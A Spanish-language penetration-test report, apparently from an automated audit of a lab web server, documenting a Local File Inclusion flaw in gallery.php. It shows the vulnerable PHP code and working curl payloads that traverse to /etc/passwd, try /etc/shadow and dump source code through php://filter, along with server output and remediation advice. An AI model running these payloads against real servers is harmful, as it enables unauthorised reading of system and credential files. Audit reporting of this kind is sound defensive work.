# Informe de Auditoría de Seguridad — Local File Inclusion (LFI)

**Fecha:** 2026-04-27T12:11:52 UTC  
**Auditor:** Penetration Tester Experto (Kali Linux)  
**Objetivo:** http://web.dev.local:8081  
**Resultado:** VULN_FOUND: true | VULN_EXPLOITED: true

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php`. La vulnerabilidad permite a un atacante no autenticado leer archivos arbitrarios del sistema operativo, exponiendo información sensible del servidor.

---

## 2. Reconocimiento

### 2.1 Tecnología Identificada

- **Servidor:** PHP (Apache/nginx sobre Linux)
- **Ruta raíz web:** `/var/www/html/` (revelada por error de PHP)
- **Sistema Operativo:** Linux Ubuntu (kernel 6.8.0-110-generic)

### 2.2 Puntos de Entrada Descubiertos

Al analizar la página principal (`http://web.dev.local:8081/`) se identificaron los siguientes enlaces dinámicos:

```
gallery.php?page=modern
gallery.php?page=classic
gallery.php?page=abstract
gallery.php?page=about
```

El parámetro `page` es el vector de ataque principal.

---

## 3. Análisis del Código Fuente

Mediante el wrapper `php://filter`, se obtuvo el código fuente de `gallery.php`:

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php"
```

Lógica vulnerable identificada:

```php
$page = $_GET['page'] ?? 'modern';

if (strpos($page, '.') !== false) {
    // Si tiene extensión, se usa tal cual → VULNERABLE a path traversal
    $file = $page;
} else {
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    // Intenta incluir igualmente
    @include($file);
}
```

**Causa raíz:** El código no sanitiza el input del usuario. Si el valor de `page` contiene un punto (`.`), se usa directamente como ruta de fichero en `include()`, permitiendo directory traversal con `../`.

---

## 4. Confirmación de la Vulnerabilidad (VULN_FOUND: true)

### 4.1 Payload de Prueba de Concepto

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```

**Respuesta del servidor:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

La lectura de `/etc/passwd` confirma la vulnerabilidad LFI.

---

## 5. Explotación (VULN_EXPLOITED: true)

### 5.1 Lectura de Ficheros del Sistema

#### /etc/passwd (exitoso)

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```
→ **ÉXITO** — Contenido completo leído (ver sección 4.1)

#### /etc/shadow (fallido — sin permisos)

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/shadow"
```
→ Error: `Permission denied` — El proceso web corre como `www-data` (sin acceso a shadow)

#### /etc/hosts (exitoso)

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/hosts"
```
→ **ÉXITO:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
172.19.0.2   d5054e367753
```

#### /proc/version (exitoso)

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../proc/version"
```
→ **ÉXITO:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) (x86_64-linux-gnu-gcc-13 13.3.0) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

### 5.2 Lectura de Código Fuente de la Aplicación (PHP Wrapper)

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php"
# Decodificar con: | grep -oP '[A-Za-z0-9+/]{50,}={0,2}' | tail -1 | base64 -d
```
→ **ÉXITO** — Código fuente PHP completo obtenido (incluyendo la lógica vulnerable documentada en la sección 3)

### 5.3 Path Disclosure

El error al intentar leer `/etc/shadow` reveló la ruta absoluta del servidor:

```
include(/etc/shadow): Failed to open stream: Permission denied in /var/www/html/gallery.php on line 104
```

Ruta confirmada: **`/var/www/html/`**

---

## 6. Resumen de Payloads

| Payload | Técnica | Resultado |
|---|---|---|
| `../../../etc/passwd` | Directory Traversal | ✅ ÉXITO |
| `../../../etc/shadow` | Directory Traversal | ❌ Sin permisos |
| `../../../etc/hosts` | Directory Traversal | ✅ ÉXITO |
| `../../../proc/version` | Directory Traversal | ✅ ÉXITO |
| `php://filter/convert.base64-encode/resource=gallery.php` | PHP Wrapper | ✅ ÉXITO |
| `....//....//....//etc/passwd` | Evasión de filtros | ❌ Filtrado |

---

## 7. Impacto

- **Confidencialidad:** ALTA — Lectura de ficheros arbitrarios del sistema
- **Integridad:** MEDIA — Posible escalada a RCE mediante Log Poisoning (no implementado en este laboratorio)
- **Disponibilidad:** BAJA — No afecta directamente

### Información Sensible Obtenida:
1. Lista completa de usuarios del sistema (`/etc/passwd`)
2. Código fuente completo de la aplicación web
3. Configuración de red del servidor (`/etc/hosts`, hostname: `d5054e367753`)
4. Versión exacta del kernel Linux (`6.8.0-110-generic`)
5. Ruta absoluta del servidor web (`/var/www/html/`)

---

## 8. Recomendaciones

1. **Validar y sanitizar** el parámetro `page` con una whitelist de valores permitidos
2. **Nunca pasar input de usuario** directamente a `include()`, `require()`, `fopen()` u otras funciones de fichero
3. **Implementar open_basedir** en PHP para restringir el acceso al sistema de ficheros
4. **Deshabilitar wrappers PHP** innecesarios (`allow_url_include = Off`, `allow_url_fopen = Off`)
5. **Ejecutar el servidor web** con el mínimo de privilegios posible

---

## 9. Conclusión

La vulnerabilidad de Local File Inclusion identificada en `gallery.php?page=` es **crítica**. Permite la lectura de ficheros del sistema operativo sin autenticación previa. La explotación fue exitosa leyendo `/etc/passwd` y otros ficheros del sistema mediante directory traversal (`../`), y el código fuente completo de la aplicación mediante PHP wrappers. Esta vulnerabilidad podría ser escalada a Remote Code Execution (RCE) mediante técnicas como Log Poisoning.

**CVSS Score estimado:** 9.1 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
